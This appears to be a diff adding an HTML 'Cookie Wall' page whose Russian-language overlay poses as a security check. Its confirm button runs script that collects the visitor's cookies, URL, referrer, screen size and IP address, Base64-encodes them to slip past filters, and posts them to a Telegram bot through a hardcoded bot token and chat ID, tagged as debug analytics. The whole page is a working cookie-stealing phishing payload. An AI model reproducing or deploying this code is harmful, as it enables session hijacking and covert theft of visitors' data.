@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Cookie Wall</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.9);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            z-index: 9999;
+        }
+    </style>
+</head>
+<body>
+    <div class="overlay">
+        <div style="text-align: center">
+            <h2>🔒 Для доступа к сайту требуется проверка безопасности</h2>
+            <button style="padding: 15px; font-size: 18px" onclick="stealCookies()">ПОДТВЕРДИТЬ</button>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = '7593021707:AAHW29zq3d78rihpSNAMxlbxK3dhCUHh4I8';
+        const CHAT_ID = '7386938500';
+
+        async function exfiltrate(data) {
+            // Шифруем данные в Base64 для обхода простых фильтров
+            const payload = btoa(JSON.stringify({
+                cookies: document.cookie,
+                origin: location.href,
+                referrer: document.referrer,
+                screen: `${screen.width}x${screen.height}`,
+                ip: await fetch('https://api.ipify.org?format=json').then(r => r.json())
+            }));
+
+            // Отправка через Telegram API с маскировкой под аналитику
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: `📡 [DEBUG] ${payload}`
+                })
+            });
+        }
+
+        function stealCookies() {
+            // Принудительно записываем сессионную куку если пусто
+            if(!document.cookie.includes('=')) {
+                document.cookie = `session_fallback=${Date.now()}; path=/; SameSite=Lax`;
+            }
+            
+            exfiltrate();
+            document.querySelector('.overlay').remove();
+        }
+    </script>
+</body>
+</html>
